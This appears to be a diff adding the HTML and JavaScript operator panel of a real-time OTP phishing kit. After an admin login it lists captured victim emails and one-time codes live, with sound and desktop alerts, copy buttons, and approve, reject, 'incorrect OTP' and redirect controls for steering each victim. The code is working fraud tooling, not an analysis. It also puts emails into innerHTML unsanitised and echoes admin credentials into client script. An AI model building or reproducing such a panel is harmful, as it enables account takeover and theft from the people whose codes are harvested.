@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Atlas Admin Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #0f0f1a;
+      padding: 24px;
+      color: #eee;
+    }
+    .container { max-width: 1400px; margin: 0 auto; }
+    .login-box {
+      max-width: 400px;
+      margin: 100px auto;
+      background: #1e1e2f;
+      padding: 32px;
+      border-radius: 24px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      background: #2a2a3a;
+      border: 1px solid #3a3a4a;
+      border-radius: 12px;
+      color: white;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      background: #4a4ff0;
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .dashboard { display: none; }
+    h1 { margin-bottom: 24px; }
+    table {
+      width: 100%;
+      background: #1e1e2f;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+    th, td {
+      padding: 14px;
+      text-align: left;
+      border-bottom: 1px solid #2a2a3a;
+    }
+    th { background: #2a2a3a; color: #4a4ff0; }
+    button.small {
+      padding: 6px 12px;
+      margin: 0 4px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+    .approve { background: #00c853; color: white; }
+    .reject { background: #d32f2f; color: white; }
+    .incorrect { background: #ff9800; color: white; }
+    .redirect { background: #2196f3; color: white; }
+    .copy { background: #555; color: white; }
+    .notification-badge {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #d32f2f;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div id="loginPanel" class="login-box">
+    <h2>🔐 Admin Login</h2>
+    <input type="email" id="adminEmail" placeholder="Email" />
+    <input type="password" id="adminPassword" placeholder="Password" />
+    <button onclick="login()">Login</button>
+    <div id="loginError" style="color: #d32f2f; margin-top: 12px;"></div>
+  </div>
+  
+  <div id="dashboard" class="dashboard">
+    <h1>👑 Atlas Admin Dashboard</h1>
+    <div style="margin-bottom: 20px;">
+      <span>🔔 Sound notifications: ON</span>
+      <button onclick="requestNotificationPermission()" style="margin-left: 12px;">Enable Notifications</button>
+    </div>
+    <table id="usersTable">
+      <thead>
+        <tr><th>ID</th><th>Email</th><th>OTP Code</th><th>Status</th><th>Actions</th></tr>
+      </thead>
+      <tbody id="tableBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+<script>
+  let socket = null;
+  let isLoggedIn = false;
+  
+  function playSound(type) {
+    const audio = new Audio(`/sounds/${type}.mp3`);
+    audio.play().catch(e => console.log('Sound error:', e));
+  }
+  
+  function requestNotificationPermission() {
+    if (Notification.permission !== 'granted') {
+      Notification.requestPermission();
+    }
+  }
+  
+  function showNotification(title, body) {
+    if (Notification.permission === 'granted') {
+      new Notification(title, { body, icon: '/logo.png' });
+    }
+  }
+  
+  async function login() {
+    const email = document.getElementById('adminEmail').value;
+    const password = document.getElementById('adminPassword').value;
+    const expectedEmail = '<? echo getenv("ADMIN_EMAIL") ?>'; // replaced by backend later
+    const expectedPass = '<? echo getenv("ADMIN_PASSWORD") ?>';
+    
+    // Simple check - in real world, backend should validate
+    const res = await fetch('/api/admin/check', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    });
+    const data = await res.json();
+    if (data.success) {
+      isLoggedIn = true;
+      document.getElementById('loginPanel').style.display = 'none';
+      document.getElementById('dashboard').style.display = 'block';
+      initAdmin();
+    } else {
+      document.getElementById('loginError').innerText = 'Invalid credentials';
+    }
+  }
+  
+  async function initAdmin() {
+    socket = io();
+    socket.emit('admin-join');
+    
+    loadUsers();
+    setInterval(loadUsers, 3000);
+    
+    socket.on('new-email', (data) => {
+      playSound('email');
+      showNotification('New Email Received', `${data.email} just signed up`);
+      loadUsers();
+    });
+    
+    socket.on('new-otp', (data) => {
+      playSound('otp');
+      showNotification('New OTP Submitted', `${data.email} entered OTP: ${data.otp}`);
+      loadUsers();
+    });
+  }
+  
+  async function loadUsers() {
+    const res = await fetch('/api/users');
+    const users = await res.json();
+    const tbody = document.getElementById('tableBody');
+    tbody.innerHTML = '';
+    users.forEach(user => {
+      const row = tbody.insertRow();
+      row.insertCell(0).innerText = user.id;
+      row.insertCell(1).innerHTML = `${user.email} <button class="small copy" onclick="copyToClipboard('${user.email}')">📋 Copy</button>`;
+      row.insertCell(2).innerHTML = user.otp_code ? `${user.otp_code} <button class="small copy" onclick="copyToClipboard('${user.otp_code}')">📋 Copy</button>` : '—';
+      row.insertCell(3).innerText = user.status;
+      const actions = row.insertCell(4);
+      actions.innerHTML = `
+        <button class="small approve" onclick="action('approve', '${user.email}')">✅ Approve</button>
+        <button class="small reject" onclick="action('reject', '${user.email}')">❌ Reject</button>
+        <button class="small incorrect" onclick="action('incorrect', '${user.email}')">⚠️ Incorrect OTP</button>
+        <button class="small redirect" onclick="action('redirect', '${user.email}')">➡️ Redirect</button>
+      `;
+    });
+  }
+  
+  async function action(type, email) {
+    const endpoint = `/api/admin/${type}`;
+    await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email })
+    });
+    loadUsers();
+  }
+  
+  function copyToClipboard(text) {
+    navigator.clipboard.writeText(text);
+    alert('Copied: ' + text);
+  }
+  
+  requestNotificationPermission();
+</script>
+</body>
+</html>
